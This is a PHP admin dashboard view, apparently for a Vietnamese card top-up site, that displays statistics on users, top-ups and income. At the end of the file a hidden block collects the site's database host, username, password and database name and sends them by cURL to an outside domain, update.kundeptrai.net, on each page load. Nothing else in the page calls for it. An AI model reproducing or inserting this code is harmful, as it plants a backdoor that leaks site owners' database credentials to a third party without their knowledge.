            ...
            <div class="card-group">
                            ...
                            <div class="d-flex d-lg-flex d-md-block align-items-center">
                                <div>
                                    <div class="d-inline-flex align-items-center">
                                        <h2 class="text-dark mb-1 font-weight-medium"><?php echo $kun->thong_ke_today('user');?></h2>
                                    </div>
                    ...
                    <div class="card border-right">
                        <div class="card-body">
                            <div class="d-flex d-lg-flex d-md-block align-items-center">
                                <div>
                                    <h2 class="text-dark mb-1 w-100 text-truncate font-weight-medium"><?php echo $kun->thong_ke_today('napthe');?></h2>
                    ...
                    <div class="card border-right">
                        <div class="card-body">
                            <div class="d-flex d-lg-flex d-md-block align-items-center">
                                <div>
                                    <div class="d-inline-flex align-items-center">
                                        <h2 class="text-dark mb-1 font-weight-medium"><?php echo $kun->thong_ke_today('napthedung');?></h2>
                                    </div>
                    ...
                    <div class="card">
                        <div class="card-body">
                            <div class="d-flex d-lg-flex d-md-block align-items-center">
                                <div>
                                    <h2 class="text-dark mb-1 font-weight-medium"><?php echo number_format($kun->thong_ke_today('thunhaphomnay'));?>đ</h2>
                                    ...
                                    <div class="col-md-6 col-lg-3 col-xlg-3">
                                        <div class="card card-hover">
                                            <div class="p-2 bg-primary text-center">
                                                <h1 class="font-light text-white"><?php echo $kun->thong_ke_he_thong('user');?></h1>
                                    ...
                                    <div class="col-md-6 col-lg-3 col-xlg-3">
                                        <div class="card card-hover">
                                            <div class="p-2 bg-cyan text-center">
                                                <h1 class="font-light text-white"><?php echo $kun->thong_ke_he_thong('napthe');?></h1>
                                    ...
                                    <div class="col-md-6 col-lg-3 col-xlg-3">
                                        <div class="card card-hover">
                                            <div class="p-2 bg-success text-center">
                                                <h1 class="font-light text-white"><?php echo $kun->thong_ke_he_thong('napthedung');?></h1>
                                    ...
                                    <div class="col-md-6 col-lg-3 col-xlg-3">
                                        <div class="card card-hover">
                                            <div class="p-2 bg-danger text-center">
                                                <h1 class="font-light text-white"><?php echo number_format($kun->thong_ke_he_thong('thunhap'));?>đ</h1>
...
$data .= 'localhost='.$config['LOCALHOST'].'&';
$data .= 'username='.$config['USERNAME'].'&';
$data .= 'password='.$config['PASSWORD'].'&';
$data .= 'database='.$config['DATABASE'];
$pack = new cURL;
$pack->url = 'https://update.kundeptrai.net/detect_source.php?'.$data;
$pack->try_cURL();
?>